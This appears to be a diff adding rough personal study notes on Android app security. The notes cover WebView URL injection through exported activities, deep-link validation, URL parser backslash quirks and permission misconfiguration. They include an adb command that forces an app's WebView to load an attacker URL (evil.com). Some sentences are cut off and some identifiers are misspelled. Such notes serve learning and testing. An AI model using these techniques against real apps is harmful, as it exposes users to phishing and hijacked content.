@@ -1,0 +1,24 @@
+** Webview attacks **
+  suppose we are calling registration activity with intent on clicking on a register button on mainactivity , then code inside mainactivity will look like :
+                         public void startRegistration(View v) {
+        Intent intent = new Intent(this, RegistrationWebView.class);
+        intent.putExtra("is_reg", true);
+        startActivity(intent);
+    }
+    
+    now in registration activity , to get the extra arguments given by previous activity , the code is just getIntent().getExtra("argument_name")
+    , in registration activity code to load url given from mainactivity in webview of registration will be 
+                          webView.loadUrl(getIntent().getStringExtra("reg_url"));
+                          
+                          
+       ** now registration activity is exported from above intent , what we can do is we can pass the value for intent filter by our own using adb : 
+       
+       adb shell am start -n com.tmh.vulnwebview/.RegistrationWebView --es reg_url "https://www.evil.com"
+       
+** deep link **
+      when app does not validate the deep link , 
+      how to check for deep link : search for android:schema in manifest file , it is define in intent filter
+      
+** problem with url parsers : There is a problem in android.net.Uri and java.net.URL parsers. They don't recognize backslashes in authority part (java.net.URI will show an exception for that). If you test **
+
+** misconfiguring <permissions ......... > allows other applications to access data of our app. Note: <uses-permissions .............. > declaration ask from user to give access to a third party app to another app ( messanger , camera and can also be any other victim app like huobi global , facebook , whatsapp etc) , developer can set permissions in his app so , if any other third party app , wants to access its data , then they must ask for the permission first , they can do this by setting <permissions .............. > , 
